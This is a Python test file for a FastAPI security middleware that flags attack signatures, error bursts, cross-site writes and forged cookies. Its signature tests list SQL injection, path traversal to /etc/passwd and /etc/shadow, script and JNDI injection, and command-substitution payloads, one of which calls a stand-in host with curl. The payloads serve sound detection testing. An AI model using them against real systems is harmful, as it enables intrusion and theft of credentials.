"""`security_signals.SecuritySignals`, on a small app of its own. No database.

The module is copied into portal/ unchanged; the first test fails if the copies differ.

    cd backend && pytest test_security_signals.py -v
"""
import os

import pytest
from fastapi import FastAPI, File, Form, UploadFile
from fastapi.testclient import TestClient

import security_signals as ss

_HERE = os.path.dirname(os.path.abspath(__file__))


def test_the_portal_has_the_same_copy():
    with open(os.path.join(_HERE, "security_signals.py"), encoding="utf-8") as f:
        ours = f.read()
    with open(os.path.join(_HERE, "..", "portal", "security_signals.py"), encoding="utf-8") as f:
        theirs = f.read()
    assert ours == theirs, "backend/ and portal/ security_signals.py differ: edit both"


class Rig:
    """A small app behind the middleware, with what it reported and what reached the route."""

    def __init__(self, **options):
        self.reports, self.reached = [], []
        app = FastAPI()

        @app.post("/api/form")
        def form(name: str = Form(""), note: str = Form(""), password: str = Form(""),
                 logo: UploadFile | None = File(None)):
            self.reached.append({"name": name, "note": note, "password": password,
                                 "logo": len(logo.file.read()) if logo else None})
            return {"ok": True}

        @app.get("/api/thing")
        def thing(q: str = ""):
            self.reached.append({"q": q})
            return {"ok": True}

        @app.get("/api/forbidden")
        def forbidden():
            from fastapi import HTTPException
            raise HTTPException(status_code=403)

        @app.get("/api/sync/heartbeat")
        def sync():
            from fastapi import HTTPException
            raise HTTPException(status_code=401)

        @app.get("/api/health")
        def health():
            return "OK"

        def report(kind, request, data):
            self.reports.append((kind, request.url.path, data))

        settings = {"report": report, "client_ip": lambda r: r.headers.get(
            "x-forwarded-for", r.client.host if r.client else ""),
            "skip_paths": ("/api/health",), "critical_prefix": "/api/sync/",
            "allowed_origins": ("https://admin.example",)}
        settings.update(options)
        app.add_middleware(ss.SecuritySignals, **settings)
        self.client = TestClient(app)

    def kinds(self):
        return [k for k, _, _ in self.reports]


@pytest.fixture
def clock(monkeypatch):
    class Clock:
        """The fake time, in seconds."""

        now = 10_000.0
    c = Clock()
    monkeypatch.setattr(ss, "_monotonic", lambda: c.now)
    return c


@pytest.fixture
def rig(clock):
    return Rig()


def _ip(n):
    return {"X-Forwarded-For": f"203.0.113.{n}"}


# ── never in the way ──────────────────────────────────────────────────────────

REAL_TEXT = [
    "O'Brien", "Nguyễn María-José", "Rock & Roll", "drop off the radios at the desk; thanks",
    "Can do 8-12, or 1 = fine", "union hall shift; select a radio", "I'll sleep (maybe) at 3",
    "<3 volunteering!", "email me: a@b.org", "C:\\Users\\me", "50% off", "{{shifts}}",
    "Tom & cat lovers", "see https://bsidescharm.org/schedule", "x' or 'y", "one..two",
    "🦀 crab", "javascript developer", "on loan = yes",
]


@pytest.mark.parametrize("text", REAL_TEXT)
def test_real_text_is_never_a_signal(rig, text):
    assert rig.client.post("/api/form", data={"name": text, "note": text}).status_code == 200
    assert rig.client.get("/api/thing", params={"q": text}).status_code == 200
    assert rig.reports == [] and rig.reached[0]["name"] == text


def test_the_route_still_gets_the_body_and_its_file(rig):
    png = b"\x89PNG\r\n\x1a\n\x00\x00\x00" * 50          # NULs in a file are fine
    r = rig.client.post("/api/form", data={"name": "a"}, files={"logo": ("l.png", png)})
    assert r.status_code == 200 and rig.reached == [
        {"name": "a", "note": "", "password": "", "logo": len(png)}]
    assert rig.reports == []


def test_skipped_paths_are_not_watched(rig):
    for _ in range(30):
        rig.client.get("/api/health?q=' union select 1--", headers={"User-Agent": "sqlmap"})
    assert rig.reports == []


# ── signatures ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("payload, rule", [
    ("1' UNION ALL SELECT username, password FROM users--", "sql_union"),
    ("x' or '1'='1", "sql_tautology"),
    ("a' OR 1=1", "sql_tautology"),
    ("1; DROP TABLE users", "sql_stacked"),
    ("1 AND pg_sleep(5)", "sql_sleep"),
    ("1; WAITFOR DELAY '0:0:5'", "sql_sleep"),
    ("select * from information_schema.tables", "sql_catalog"),
    ("../../etc/passwd", "path_traversal"),
    ("%2e%2e/secret", "path_traversal"),
    ("<script>alert(1)</script>", "script"),
    ("<img src=x onerror=alert(1)>", "script"),
    ("javascript:alert(1)", "script"),
    ("{{7*7}}", "template"),
    ("${jndi:ldap://x/a}", "template"),
    ("; cat /etc/shadow", "command"),
    ("$(curl evil.example)", "command"),
])
def test_each_signature_is_an_attack_finding(rig, payload, rule):
    assert rig.client.post("/api/form", data={"note": payload}, headers=_ip(1)).status_code == 200
    (kind, path, data) = rig.reports[0]
    assert kind == "attack_signature" and path == "/api/form"
    assert rule in data["rules"] and data["where"] == "form:note"
    assert data["client_key"] == "203.0.113.1" and data["held_back"] == 0


def test_signatures_in_the_query_the_path_and_the_user_agent(rig):
    rig.client.get("/api/thing", params={"q": "1' union select 2"}, headers=_ip(1))
    rig.client.get("/api/thing/../../etc/passwd", headers=_ip(2))
    rig.client.get("/api/thing", headers={**_ip(3), "User-Agent": "sqlmap/1.8"})
    rig.client.get("/api/.env", headers=_ip(4))
    rig.client.get("/api/x.php", headers=_ip(5))
    where = {d["client_key"]: (d["rules"], d["where"]) for _, _, d in rig.reports}
    assert where["203.0.113.1"] == (["sql_union"], "query:q")
    assert where["203.0.113.3"] == (["scanner_agent"], "user-agent")
    assert where["203.0.113.4"][0] == ["probe_path"]
    assert where["203.0.113.5"][0] == ["probe_path"]
    assert "203.0.113.2" in where


def test_a_password_field_is_never_inspected(rig):
    rig.client.post("/api/form", data={"password": "' or '1'='1"}, headers=_ip(1))
    assert rig.reports == [] and rig.reached[0]["password"] == "' or '1'='1"


# ── the one refusal: NUL ──────────────────────────────────────────────────────

@pytest.mark.parametrize("how", ["form", "query", "path"])
def test_a_nul_is_refused_before_the_route(rig, how):
    if how == "form":
        r = rig.client.post("/api/form", data={"name": "eve\x00"}, headers=_ip(1))
    elif how == "query":
        r = rig.client.get("/api/thing?q=a%00b", headers=_ip(1))
    else:
        r = rig.client.get("/api/thing%00.txt", headers=_ip(1))
    assert r.status_code == 400 and r.json() == {"detail": "Malformed request"}
    assert rig.reached == []
    assert rig.kinds() == ["attack_signature"] and "nul" in rig.reports[0][2]["rules"]


# ── scoring, cooldown, memory ─────────────────────────────────────────────────

def test_a_run_of_errors_crosses_the_score(rig):
    for _ in range(7):
        rig.client.get("/api/nope", headers=_ip(1))               # 404: 2 each
    assert rig.reports == []
    rig.client.get("/api/nope", headers=_ip(1))                    # 16
    (kind, _, data) = rig.reports[0]
    assert kind == "suspicious_client" and data["score"] == 16
    assert data["signals"] == {"status_404": 8} and data["status"] == 404


def test_a_404_outside_the_api_is_not_probing(rig):
    for _ in range(20):
        rig.client.get("/favicon-nope.ico", headers=_ip(1))
    assert rig.reports == []


def test_403s_add_up_faster(rig):
    for _ in range(5):
        rig.client.get("/api/forbidden", headers=_ip(1))
    assert rig.kinds() == ["suspicious_client"]


def test_the_score_forgets_after_the_window(rig, clock):
    for _ in range(7):
        rig.client.get("/api/nope", headers=_ip(1))
    clock.now += ss.WINDOW_SEC + 1
    rig.client.get("/api/nope", headers=_ip(1))
    assert rig.reports == []


def test_a_finding_is_reported_once_an_hour_with_a_count_of_the_rest(rig, clock):
    for _ in range(12):
        rig.client.get("/api/thing", params={"q": "{{7*7}}"}, headers=_ip(1))
    assert rig.kinds() == ["attack_signature", "suspicious_client"]
    clock.now += ss.NOTE_COOLDOWN_SEC + 1
    rig.client.get("/api/thing", params={"q": "{{7*7}}"}, headers=_ip(1))
    last = [d for k, _, d in rig.reports if k == "attack_signature"][-1]
    assert last["held_back"] == 11


def test_an_ipv6_64_is_one_client(rig):
    for i in range(8):
        rig.client.get("/api/nope", headers={"X-Forwarded-For": f"2001:db8:9:9::{i + 1:x}"})
    (_, _, data) = rig.reports[0]
    assert data["client_key"] == "2001:db8:9:9::/64"


def test_memory_is_capped(rig, monkeypatch):
    monkeypatch.setattr(ss, "MAX_CLIENTS", 5)
    for i in range(20):
        rig.client.get("/api/nope", headers=_ip(i))
    mw = rig.client.app.middleware_stack
    while not isinstance(mw, ss.SecuritySignals):
        mw = mw.app
    assert len(mw._clients) == 5


# ── the rest of the signals ───────────────────────────────────────────────────

def test_a_bad_sync_signature_is_critical_at_once(rig):
    rig.client.get("/api/sync/heartbeat", headers=_ip(1))
    assert rig.kinds() == ["sync_auth_fail"] and ss.SEVERITY["sync_auth_fail"] == "critical"


def test_cross_site_writes_count(rig):
    for _ in range(4):
        rig.client.post("/api/form", data={"name": "a"},
                        headers={**_ip(1), "Origin": "https://evil.example"})
    assert rig.kinds() == ["suspicious_client"]
    assert rig.reports[0][2]["signals"] == {"cross_site": 4}
    rig.client.post("/api/form", data={"name": "a"},
                    headers={**_ip(2), "Origin": "https://admin.example",
                             "Sec-Fetch-Site": "same-origin"})
    assert len(rig.reports) == 1


def test_a_bad_cookie_counts_when_the_app_checks(clock):
    rig = Rig(cookie_check=lambda r: False if r.cookies.get("session") == "forged" else None)
    for _ in range(4):
        rig.client.get("/api/thing", headers={**_ip(1), "Cookie": "session=forged"})
    assert rig.kinds() == ["suspicious_client"]
    assert rig.reports[0][2]["signals"] == {"bad_cookie": 4}


def test_a_failing_report_never_fails_the_request(clock, caplog):
    def broken(kind, request, data):
        raise RuntimeError("db down")
    rig = Rig(report=broken)
    r = rig.client.get("/api/thing", params={"q": "{{7*7}}"}, headers=_ip(1))
    assert r.status_code == 200 and "report of attack_signature failed" in caplog.text


def test_a_body_the_parser_chokes_on_is_a_signal_not_a_crash(rig):
    r = rig.client.post("/api/form", content=b"--x\r\nnot really multipart",
                        headers={**_ip(1), "Content-Type": "multipart/form-data; boundary=x"})
    assert r.status_code in (400, 422)


@pytest.mark.parametrize("ip, key", [
    ("203.0.113.9", "203.0.113.9"), ("2001:db8::1", "2001:db8::/64"),
    ("::ffff:198.51.100.7", "198.51.100.7"), ("unknown", "unknown"),
])
def test_client_key(ip, key):
    assert ss.client_key(ip) == key
